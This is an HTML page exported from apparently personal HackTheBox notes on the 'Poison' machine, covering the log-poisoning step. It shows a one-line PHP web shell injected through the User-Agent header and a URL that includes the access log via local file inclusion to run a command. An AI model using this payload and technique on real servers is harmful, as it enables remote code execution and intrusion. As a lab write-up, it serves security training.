<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>injecting php system call</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><strong>Index</strong></p>
<p><a href="HacktheBox--Linux_Boxes--poison.html">poison</a></p>

<ol>
<li><a href="HacktheBox--Linux_Boxes--poison--nmap.html">nmap</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--poison--nmap--all_ports.html">all ports</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--poison--http.html">http</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--poison--http--gobuster.html">gobuster</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--poison--http--gobuster--ini.php.html">ini.php</a></li>
<li><a href="HacktheBox--Linux_Boxes--poison--http--gobuster--info.php.html">info.php</a></li>
<li><a href="HacktheBox--Linux_Boxes--poison--http--gobuster--phpinfo.html">phpinfo</a></li>
<li><a href="HacktheBox--Linux_Boxes--poison--http--gobuster--listedfiles.php.html">listedfiles.php</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Linux_Boxes--poison--foothold_1_backuppasswd.txt.html">foothold 1 backuppasswd.txt</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--poison--foothold_1_backuppasswd.txt--base64_decode.py.html">base64_decode.py</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--poison--foothold_1_backuppasswd.txt--base64_decode.py--scriptname_=_-etc-passwd.html">scriptname = /etc/passwd</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--poison--foothold_1_backuppasswd.txt--ssh_charix.html">ssh charix</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--poison--foothold_2_phpinfo.php_race_condition.html">foothold 2: phpinfo.php race condition</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--poison--foothold_2_phpinfo.php_race_condition--race_condition_concept_w-_burp.html">race condition concept w/ burp</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--poison--foothold_2_phpinfo.php_race_condition--race_condition_concept_w-_burp--phpinfo.php_php_variables.html">phpinfo.php php variables</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--poison--foothold_2_phpinfo.php_race_condition--payloadallthethings.html">payloadallthethings</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--poison--foothold_2_phpinfo.php_race_condition--payloadallthethings--revshell.php.html">revshell.php</a></li>
<li><a href="HacktheBox--Linux_Boxes--poison--foothold_2_phpinfo.php_race_condition--payloadallthethings--phpinfolfi.py.html">phpinfolfi.py</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--poison--foothold_2_phpinfo.php_race_condition--payloadallthethings--phpinfolfi.py--tweak_REQ1.html">tweak REQ1</a></li>
<li><a href="HacktheBox--Linux_Boxes--poison--foothold_2_phpinfo.php_race_condition--payloadallthethings--phpinfolfi.py--tweak_tmp_name_phpinfo_output.html">tweak tmp_name phpinfo output</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--poison--foothold_2_phpinfo.php_race_condition--payloadallthethings--run.html">run</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--poison--foothold_2_phpinfo.php_race_condition---var-log-httpd-access.log.html">/var/log/httpd-access.log</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--poison--foothold_3_Log_Poisoning.html">foothold 3: Log Poisoning</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--poison--foothold_3_Log_Poisoning--user-agent_manipulation.html">user-agent manipulation</a></li>
<li><a href="HacktheBox--Linux_Boxes--poison--foothold_3_Log_Poisoning--user-agent_php_code_execution.html">user-agent php code execution</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--poison--foothold_3_Log_Poisoning--user-agent_php_code_execution--Warning_about_using_double-quotes.html">Warning about using double-quotes</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--poison--foothold_3_Log_Poisoning--injecting_php_system_call.html">injecting php system call</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--poison--foothold_3_Log_Poisoning--injecting_php_system_call--hostname_&_ls_-la.html">hostname & ls -la</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--poison--foothold_3_Log_Poisoning--reverse_shell.html">reverse shell</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--poison--priv_esc.html">priv esc</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--poison--priv_esc--secret.zip_exfiltration.html">secret.zip exfiltration</a></li>
<li><a href="HacktheBox--Linux_Boxes--poison--priv_esc--ps_-aux.html">ps -aux</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--poison--priv_esc--ps_-aux--VNC.html">VNC</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--poison--priv_esc--VNC_port_5901.html">VNC port 5901</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--poison--priv_esc--VNC_port_5901--tunnel_port_5901_through_localhost.html">tunnel port 5901 through localhost</a></li>
<li><a href="HacktheBox--Linux_Boxes--poison--priv_esc--VNC_port_5901--vncviewer_within_tunneled_localhost.html">vncviewer within tunneled localhost</a></li>
<li><a href="HacktheBox--Linux_Boxes--poison--priv_esc--VNC_port_5901--root.html">root</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Linux_Boxes--poison--user-root.html">user/root</a></li>
<li><a href="HacktheBox--Linux_Boxes--poison--lessons_learned.html">lessons learned</a></li>
</ol></div>
<div class="page"><h1><b><u>injecting php system call</u></b></h1><h2>keeping in mind not to break the log file with double quotes, lets swap the user-agent field with a standard php system call</h2><br /><h2>&lt;?php system($_REQUEST['cmd']); ?&gt;</h2><br /><br /><img src="images/2027-1.png" alt="images/2027-1.png" /><br /><br /><img src="images/2027-2.png" alt="images/2027-2.png" /><br /><img src="images/2027-3.png" alt="images/2027-3.png" /><br /><br /><h2>now if we set our ‘cmd’ parameter to a command...</h2><br /><h2>view-source:</h2><a href="http://10.10.10.84/browse.php?file=%2Fvar%2Flog%2Fhttpd-access.log&cmd=uname%20-a">http://10.10.10.84/browse.php?file=%2Fvar%2Flog%2Fhttpd-access.log&amp;cmd=uname%20-a</a><br /><img src="images/2027-4.png" alt="images/2027-4.png" /><br /><br /><img src="images/2027-5.png" alt="images/2027-5.png" /></div></div>
</body></html>